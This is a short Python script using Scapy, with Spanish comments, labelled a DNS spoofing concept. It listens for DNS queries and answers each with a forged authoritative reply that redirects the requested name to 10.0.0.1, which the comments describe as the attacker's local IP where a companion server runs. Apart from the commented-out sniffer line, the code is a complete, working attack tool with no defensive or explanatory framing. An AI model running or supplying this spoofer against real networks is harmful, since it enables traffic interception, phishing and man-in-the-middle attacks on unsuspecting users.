# Concepto de DNS Spoofing (Requiere privilegios de root)
from scapy.all import *

def dns_spoof(pkt):
    if pkt.haslayer(DNSQR): # Si es una consulta DNS
        # Forzamos la respuesta a nuestra IP local donde corre server.py
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
                      an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata="10.0.0.1"))
        send(spoofed_pkt, verbose=0)
        print(f"[!] Redirigiendo consulta de: {pkt[DNS].qd.qname}")

# sniffer que escucha peticiones DNS
# sniff(filter="udp port 53", prn=dns_spoof)